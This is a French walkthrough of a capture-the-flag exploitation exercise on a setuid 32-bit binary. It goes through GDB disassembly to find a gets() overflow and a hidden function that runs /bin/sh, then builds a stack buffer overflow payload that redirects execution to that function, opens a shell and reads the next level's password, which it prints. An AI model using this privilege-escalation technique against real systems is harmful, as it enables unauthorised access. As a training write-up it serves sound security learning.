WALKTHROUGH LEVEL1 

---> [ls -la](../level1/ressources/full_walk.md#ls) :
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1

=> nous disposons d'un fichier level1, appartenant à level2. Pour les 
permissions user/group/other :
- permission s sur la partie user : bit SUID (setuid) activé donc il ne
	s'exécute qu'avec les privilèges du owner (ici level2) et non avec les
	privilèges du user (ici level1)
- permission s sur la partie group : bit GUID (getuid) activé sur 
	l'execution. Quand ce fichier est exécuté, le processus s'exécute avec
	les permissions du groupe owner (level2) en plus de celles de l'owner
	du fichier.
- permission + : des ACL (listes de contrôle d'accès) sont appliquées.

---> [getfacl](../level1/ressources/full_walk.md#getfacl) level1 (pour voir les ACL) : 

---> [file](../level1/ressources/full_walk.md#file) level1 (quel est le type de
ce fichier)
level1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1
(SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID
[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped


---> ./level1
Ne fait rien. Le programme attend une entrée puis s'arrête apres enter

---> GDB : gdb level1 / [disas main](../level1/ressources/full_walk.md#disas-main) 

Dump of assembler code for function main:
   ...
   0x08048486 <+6>:		sub    $0x50,%esp /Alloc 1 buffer de 80o sur stack
   0x08048490 <+16>:	call   0x8048340 <gets@plt> /appel de la fonction gets
End of assembler dump.

=> on repère les call : on a l'appel a une fonction gets@plt
PLT = Procedure Linkage Table. Cela sert a appeler des fonctions externes
dont l'adresse est inconnue au moment du linking et qui ne sera connue qu'au
moment de la liaison dynamique lors de l'exécution.

Donc le programme appelle la fonction gets d'une bibliothèque partagée. La
fonction gets est une fonction C connue pour sa vulnérabilité aux débordements
de tampon !! En effet, elle ne vérifie pas la taille de l'entrée par rapport à
la taille du tampon de destination. Elle continuera à lire les caractères et à 
les stocker dans le tampon jusqu'à ce qu'elle rencontre une nouvelle ligne ou 
la fin de fichier, sans se soucier des limites du tampon.

Ce tampon est de 80 octets (0x50)

On va essayer de faire un Buffer Overflow, surtout que sur cette VM, les
protections Canary sont désactivées...

---> GDB : gdb level1 / [info function](../level1/ressources/full_walk.md#info-function)(liste toutes les fonctions du programme)
...
0x08048444  run
0x08048480  main
...

=> la plupart des fonctions répertoriées (gets, fwrite, system) font partie de
bibliothèques partagées comme l'atteste le @plt qui suit. Il reste deux fonctions
propres au programme level1 : main et run. Lorsqu'on a desassemblé la fonction 
main, on n'a pas vu d'appel à run... Alors ?

---> GDB : set disassembly-flavor intel
Ce debugger peut utiliser 2 syntaxes :
- AT&T (La source est spécifiée avant la destination)
- Intel (la destination est spécifiée avant la source) et donne des précisions

---> GDB : gdb level1 / [disas run](../level1/ressources/full_walk.md#disas-run)

-> 0x08048444 <+0>:		push   ebp /-> debut de la fonction run
   ...
-> 0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584 /-> arg pour la fct system
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   ...

=> A retenir de ces info : 
- la fonction run commence a l'offset 0x08048444
- run envoie a la fonction system() un argument enregistré sur l'offset 0x8048584
system() sert a executer une commande shell. L'adresse placée avant est la
commande à exécuter ! 

On vérifie avec : gdb x/s 0x8048584
0x8048584:	 "/bin/sh"

Si on vérifie les autres offset présents dans la fonction run : 
gdb x/s 0x80497c0 -> 0x80497c0 <stdout@@GLIBC_2.0>:	 ""
gdb x/s 0x8048570 -> 0x8048570:	 "Good... Wait what?\n"

Mmmmmh... Attend, quoi ?

DONC la commande run, repertoriée dans le programme level1, lance un shell...
Mais elle écrit d'abord un texte : Good... Wait what?

|------------------------------------------------------------------------------------|
| L'objectif est donc de forcer l'appel a la fonction run, grâce à un exploit qui va |
| - d'un part créer un buffer overflow qui aboutira au lancement de run              |
| - d'autre part, une fois que run nous ouvre un terminal sh, le laisser ouvert pour |
|   qu'on puisse y entrer ce que l'on veut                                           |
|------------------------------------------------------------------------------------|

---> On va faire un buffer overflow : 
on veut envoyer 80 caractères en guise d'input pour notre programme. 
donc on va créer un fichier /tmp/buffertrick et l'injecter via gdb : 

1) creation du fichier :
python -c 'print "a"*80' > /tmp/buffertrick
cat /tmp/buffertrick
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

2) injection :
gdb level1
run < /tmp/buffertrick
Starting program: /home/user/level1/level1 < /tmp/buffertrick

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()

Ok Donc avec 80 caractères, on a bien un buffer overflow -> segfault !

3) ajout du pointeur dans notre script :
on sait que la commande run commence à l'adresse 0x08048444
Au lieu de mettre 80 caractères de padding, on en met 76 et les 4 derniers
seront consacrés à l'ajout de cette adresse sous le format little-endian
(c'est à dire qu'on la rentre à l'envers)

python -c 'print "a"*76+"\x44\x84\x04\x08"' > /tmp/buffertrick

4) injection dans run :

cat /tmp/buffertrick | ./level1
Cela segfault immédiatement. Le trick : on veut que notre cat reste ouvert
et puisse recevoir un input depuis l'entrée standard, sinon le programme
s'exécute trop vite et on n'a pas le temps de faire notre commande. Cela est
possible en ajoutant - avant le pipe : cela laisse ouvert notre cat, qui reste
en attente d'une entrée via standard + enter.

cat /tmp/buffertrick - | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77